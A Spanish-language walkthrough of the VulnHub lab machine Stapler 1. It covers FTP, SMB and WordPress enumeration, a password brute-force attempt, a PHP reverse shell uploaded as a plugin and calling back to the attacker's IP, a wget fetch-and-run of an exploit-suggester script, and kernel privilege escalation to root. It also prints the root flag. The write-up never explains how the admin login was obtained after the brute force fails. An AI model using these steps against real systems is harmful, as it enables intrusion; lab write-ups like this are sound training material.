
**Plataforma:** VulnHub **Dificultad:** Media 

---

## 1. Reconocimiento

### ARP Scan

```bash
arp-scan -l
```

```
192.168.6.134   08:00:27:f1:ad:ae   PCS Systemtechnik GmbH
```

### Ping

```bash
ping -c 2 192.168.6.134
```

Resultado: 100% packet loss. El host bloquea ICMP, hay que escanear con `-Pn`.

### Nmap (descubrimiento de puertos)

```bash
nmap -sS -p- --open -Pn -n -vvv --min-rate 5000 -oN synscan.nmap 192.168.6.134
```

```
21/tcp    open  ftp
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
139/tcp   open  netbios-ssn
666/tcp   open  doom
3306/tcp  open  mysql
12380/tcp open  unknown
```

### Nmap (versiones y scripts)

```bash
nmap -sC -sV -p21,22,53,80,139,666,3306,12380 192.168.6.134 -oN detailed.nmap
```

| Puerto | Servicio    | Versión                             |
| ------ | ----------- | ----------------------------------- |
| 21     | ftp         | vsftpd 2.0.8+ (banner) / real 3.0.3 |
| 22     | ssh         | OpenSSH 7.2p2 Ubuntu                |
| 53     | domain      | dnsmasq 2.75                        |
| 80     | http        | PHP cli server 5.5+                 |
| 139    | netbios-ssn | Samba smbd 4.3.9-Ubuntu             |
| 666    | doom        | closed (falso positivo)             |
| 3306   | mysql       | MySQL 5.7.12-0ubuntu1               |
| 12380  | http        | Apache 2.4.18 (Ubuntu)              |

### Whatweb

```bash
whatweb 192.168.6.134
```

```
http://192.168.6.134 [404 Not Found] Country[RESERVED][ZZ], HTML5
```

---

## 2. Enumeración de servicios

### FTP (21) — login anónimo

```bash
ftp 192.168.6.134
# Usuario: anonymous
# Password: (cualquiera)
```

```bash
ftp> ls -la
ftp> get note
```

Contenido de `note`:

```
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```

→ Dos usuarios potenciales: **John**, **Elly**.

### SMB (139) — acceso como invitado

```bash
smbclient -L //192.168.6.134 -N
```

![Recursos SMB disponibles, incluyendo el disco de kathy](https://github.com/jjaguero/Writetups/raw/main/Vulnhub/Stapler1/images/Pasted%20image%2020260905172207.png)

El share de `kathy` muestra un mensaje llamativo. Al entrar a la carpeta:

![Contenido de la carpeta de kathy](https://github.com/jjaguero/Writetups/raw/main/Vulnhub/Stapler1/images/Pasted%20image%2020260905172656.png)

Revisamos también el contenido de `tmp`:

![Contenido del share tmp](https://github.com/jjaguero/Writetups/raw/main/Vulnhub/Stapler1/images/Pasted%20image%2020260905172726.png)

Descarga masiva de ambos recursos:

```bash
smbclient '\\192.168.6.134\tmp' -N -c 'prompt OFF;recurse ON; mget *'
smbclient '\\192.168.6.134\kathy' -N -c 'prompt OFF;recurse ON; mget *'
```

Recursos relevantes:

- Recurso `kathy` → archivo `todo-list.txt`:
    
    ```
    I'm making sure to backup anything important for Initech, Kathy
    ```
    
- Carpeta `backup` dentro de `kathy` → backup de un **WordPress** completo + un **archivo de configuración FTP**, confirmando que el usuario `anonymous` es válido.

![Contenido del backup: WordPress extraído + configuración FTP](https://github.com/jjaguero/Writetups/raw/main/Vulnhub/Stapler1/images/Pasted%20image%2020260905174312.png)

### HTTP (80)

Redirige a una página en blanco (404), sin contenido explotable directo.

### HTTP (12380) — aplicación real

Aquí aparece la aplicación real del objetivo:

![Landing page en el puerto 12380](https://github.com/jjaguero/Writetups/raw/main/Vulnhub/Stapler1/images/Pasted%20image%2020260905174959.png)

Es una plantilla de Bootstrap con un botón "Free Download here" que redirige a la página original de la plantilla (sin valor de explotación):

![Botón de descarga de la plantilla Bootstrap](https://github.com/jjaguero/Writetups/raw/main/Vulnhub/Stapler1/images/Pasted%20image%2020260905175122.png)

Nada relevante fuzzeando por HTTP. Al forzar HTTPS en el mismo puerto, aparece contenido distinto:

![Contenido nuevo al acceder por HTTPS](https://github.com/jjaguero/Writetups/raw/main/Vulnhub/Stapler1/images/Pasted%20image%2020260905183816.png)

Escaneo de directorios:

```bash
nikto -h https://192.168.6.134:12380 -ssl
```

![Resultado del escaneo con nikto](https://github.com/jjaguero/Writetups/raw/main/Vulnhub/Stapler1/images/Pasted%20image%2020260905184158.png)

Hallazgos:

- `robots.txt` expuesto
- `phpmyadmin` expuesto
- Dominio interno: `red.initech` → agregar a `/etc/hosts`

```bash
echo "192.168.6.134 red.initech" | sudo tee -a /etc/hosts
```

`robots.txt`:

```
User-agent: *
Disallow: /admin112233/
Disallow: /blogblog/
```

- `/admin112233/` → vulnerable a XSS (no explotado, no es el vector principal)
- `/blogblog/` → instalación de **WordPress**

![Panel de login de WordPress en /blogblog/](https://github.com/jjaguero/Writetups/raw/main/Vulnhub/Stapler1/images/Pasted%20image%2020260905184558.png)

![Detalle del panel de login](https://github.com/jjaguero/Writetups/raw/main/Vulnhub/Stapler1/images/Pasted%20image%2020260905184607.png)

### WPScan — enumeración

```bash
wpscan --url https://192.168.6.134:12380/blogblog/ -e u --disable-tls-checks
```

Hallazgos clave:

- Header `Dave: Something doesn't look right here` (pista/easter egg)
- XML-RPC habilitado (`xmlrpc.php`)
- WordPress **4.2.1** (desactualizado, 2015)
- Tema `bhost` v1.2.9 (desactualizado)
- Registro de usuarios habilitado
- **Listado de directorio abierto en `wp-content/uploads/`**

![Enumeración de usuarios con wpscan](https://github.com/jjaguero/Writetups/raw/main/Vulnhub/Stapler1/images/Pasted%20image%2020260905185155.png)

### Fuerza bruta de credenciales

```bash
wpscan --url https://192.168.6.134:12380/blogblog --disable-tls-checks \
  -U john -P /usr/share/wordlists/rockyou.txt --password-attack wp-login
```

Resultado: contraseña de `john` no encontrada en el diccionario usado en ese intento (probar con otros usuarios/diccionarios si no hay acceso directo, o pivotear por el vector de subida de plugins si ya se cuenta con credenciales válidas de otro modo).

---

## 3. Explotación

Con acceso al panel de WordPress (usuario válido con permisos de administrador), el vector de entrada es la **subida de un plugin malicioso** empaquetado como shell PHP (reverse shell de pentestmonkey).

![Panel de administración de WordPress con el usuario john](https://github.com/jjaguero/Writetups/raw/main/Vulnhub/Stapler1/images/Pasted%20image%2020260905190924.png)

De todas las opciones del panel, la relevante es **instalar un plugin y subirlo directamente a `wp-content`**.

### Preparación del payload

Reverse shell PHP (pentestmonkey), modificando IP y puerto propios:

```php
$ip = '192.168.6.131';
$port = 8000;
```

### Subida vía panel de WordPress

`Plugins > Añadir nuevo > Subir plugin` → se sube el `.php` empaquetado como si fuera un plugin.

![Reverse shell de pentestmonkey preparada como plugin](https://github.com/jjaguero/Writetups/raw/main/Vulnhub/Stapler1/images/Pasted%20image%2020260905191259.png)

Al darle instalar:

![Prompt de instalación del plugin](https://github.com/jjaguero/Writetups/raw/main/Vulnhub/Stapler1/images/Pasted%20image%2020260905191345.png)

Durante la instalación, WordPress solicita credenciales FTP para completar la operación (mecanismo estándar cuando el servidor no tiene permisos de escritura directos). Se usa la información encontrada en el backup de SMB:

![Formulario de credenciales FTP solicitado por WordPress](https://github.com/jjaguero/Writetups/raw/main/Vulnhub/Stapler1/images/Pasted%20image%2020260905191557.png)

```
Hostname: localhost
FTP Username: anonymous
FTP Password: (cualquiera / "incorrect")
```

El archivo queda en `wp-content/uploads/`.

### Obtención de la shell

```bash
# Listener
nc -lvnp 8000
```

Acceder desde el navegador a la ruta del shell subido (`.../wp-content/uploads/shell.php`) dispara la conexión inversa.

![Conexión inversa recibida como www-data](https://github.com/jjaguero/Writetups/raw/main/Vulnhub/Stapler1/images/Pasted%20image%2020260905191848.png)

```
www-data@red:/tmp$ uname -a
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
```

### Tratamiento de TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z en la máquina atacante
stty raw -echo; fg
```

---

## 4. Escalada de privilegios



```bash
www-data@red:/tmp$ uname -a
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
```

### Enumeración automatizada usada

```bash
wget --no-check-certificate https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
chmod +x les.sh
./les.sh
```

![Salida de linux-exploit-suggester.sh sugiriendo exploits para el kernel](https://github.com/jjaguero/Writetups/raw/main/Vulnhub/Stapler1/images/Pasted%20image%2020260905203309.png)

El script identificó exploits aplicables al kernel **4.4.0-21-generic** (Ubuntu). Se probó el exploit sugerido de escalada de privilegios local:

![Exploit de escalada ejecutado con éxito, shell como root](https://github.com/jjaguero/Writetups/raw/main/Vulnhub/Stapler1/images/Pasted%20image%2020260905203403.png)

### Flag root

![Flag root encontrada en el sistema](https://github.com/jjaguero/Writetups/raw/main/Vulnhub/Stapler1/images/Pasted%20image%2020260905203429.png)

```
b6b545dc11b7a270f4bad23432190c75162c4a2b
```

---

